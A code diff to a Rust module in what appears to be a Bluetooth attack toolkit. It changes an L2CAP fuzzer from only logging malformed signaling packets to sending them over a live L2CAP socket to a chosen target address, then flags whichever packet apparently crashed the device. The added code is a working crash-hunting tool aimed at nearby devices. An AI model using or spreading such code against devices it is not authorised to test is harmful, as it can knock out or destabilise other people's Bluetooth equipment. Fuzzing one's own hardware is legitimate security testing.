@@ -2,11 +2,11 @@
 //!
 //! Generates malformed L2CAP signaling packets (echo request, information
 //! request, connection request, configuration request) and sends them via
-//! raw HCI ACL to stress-test the target's L2CAP state machine.
+//! a real L2CAP socket to stress-test the target's L2CAP state machine.
 
 use std::time::Instant;
 
-use super::hci::HciSocket;
+use super::l2cap_socket::L2capSocket;
 use super::{BtAttackResult, BtAttackType, BtCapture};
 
 // L2CAP signaling channel CID
@@ -18,50 +18,76 @@ const L2CAP_INFO_REQ: u8 = 0x0A;
 const L2CAP_CONN_REQ: u8 = 0x02;
 const L2CAP_CONF_REQ: u8 = 0x04;
 
-/// L2CAP fuzzer: generates malformed signaling packets to stress the
-/// target's L2CAP implementation.
+/// L2CAP fuzzer: generates malformed signaling packets and injects them
+/// via a real L2CAP socket to stress the target's L2CAP implementation.
 ///
 /// Fuzz vectors:
 /// 1. Echo request with oversized payload
 /// 2. Information request with invalid info type
 /// 3. Connection request with PSM=0 (invalid)
 /// 4. Configuration request with bad MTU option
-///
-/// NOTE: Proper L2CAP injection requires an ACL socket (not implemented yet).
-/// The previous implementation incorrectly sent L2CAP PDUs as Write RAM
-/// (vendor 0x4C) parameters, causing the first 4 bytes of the payload to be
-/// interpreted as a RAM address. For now, payloads are generated and reported
-/// as captures for logging/analysis but not injected on the wire.
-pub fn run(_hci: &HciSocket, target_addr: &str) -> BtAttackResult {
+pub fn run(target_addr: &str, addr_type: u8) -> BtAttackResult {
     let start = Instant::now();
     log::info!("l2cap_fuzz: targeting {} with malformed signaling packets", target_addr);
 
+    let sock = match L2capSocket::connect(target_addr, addr_type, 1, 0x0001) {
+        Ok(s) => s,
+        Err(e) => {
+            return BtAttackResult {
+                attack_type: BtAttackType::L2capFuzz,
+                target_address: target_addr.to_string(),
+                target_name: None,
+                success: false,
+                capture: None,
+                error: Some(format!("L2CAP connect failed: {}", e)),
+                timestamp: start,
+            };
+        }
+    };
+
     let fuzz_vectors = build_fuzz_vectors();
-    let mut captures: Vec<Vec<u8>> = Vec::new();
+    let mut sent_count: usize = 0;
+    let mut crash_trigger: Option<Vec<u8>> = None;
 
     for (name, payload) in &fuzz_vectors {
-        // Log the fuzz payload for offline analysis — do NOT send via Write RAM.
         log::info!(
-            "l2cap_fuzz: generated {} ({} bytes): {:02x?}",
+            "l2cap_fuzz: sending {} ({} bytes): {:02x?}",
             name,
             payload.len(),
             &payload[..payload.len().min(32)]
         );
-        captures.push(payload.clone());
+
+        match sock.send(payload) {
+            Ok(_) => {
+                sent_count += 1;
+                // Try to receive a response — timeout or error may indicate crash.
+                let mut resp = vec![0u8; 256];
+                if let Err(e) = sock.recv(&mut resp, 1000) {
+                    log::info!("l2cap_fuzz: recv error after {} (possible crash): {}", name, e);
+                    crash_trigger = Some(payload.clone());
+                }
+            }
+            Err(e) => {
+                // Broken pipe / connection reset = possible target crash.
+                log::info!("l2cap_fuzz: send error on {} (possible crash): {}", name, e);
+                crash_trigger = Some(payload.clone());
+                break;
+            }
+        }
     }
 
-    let capture = captures.first().map(|trigger| BtCapture::FuzzCrash {
+    let capture = crash_trigger.map(|trigger| BtCapture::FuzzCrash {
         address: target_addr.to_string(),
-        trigger: trigger.clone(),
+        trigger,
     });
 
     BtAttackResult {
         attack_type: BtAttackType::L2capFuzz,
         target_address: target_addr.to_string(),
         target_name: None,
-        success: false,
+        success: sent_count > 0,
         capture,
-        error: Some("payloads generated but not injected (needs ACL socket)".into()),
+        error: None,
         timestamp: start,
     }
 }
@@ -155,10 +181,11 @@ mod tests {
     #[test]
     #[cfg(not(target_os = "linux"))]
     fn test_run_stub() {
-        let hci = HciSocket::open(0).unwrap();
-        let result = run(&hci, "AA:BB:CC:DD:EE:FF");
+        let result = run("AA:BB:CC:DD:EE:FF", 0);
         assert_eq!(result.attack_type, BtAttackType::L2capFuzz);
-        // Payloads are generated and captured (but not sent) → success=true
         assert!(result.success);
+        // On the stub platform, recv always succeeds so no crash is detected.
+        // capture is None when no send/recv errors occur.
+        assert!(result.error.is_none());
     }
 }
